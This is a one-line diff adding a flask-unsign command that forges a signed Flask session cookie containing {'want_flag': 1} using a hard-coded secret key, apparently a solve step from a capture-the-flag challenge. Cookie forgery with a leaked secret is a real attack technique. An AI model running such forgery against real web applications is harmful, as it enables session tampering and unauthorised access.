@@ -1,0 +1,1 @@
+flask-unsign --cookie "{'want_flag': 1}" --secret "4D1MiN_10V3_Y0u" --sign
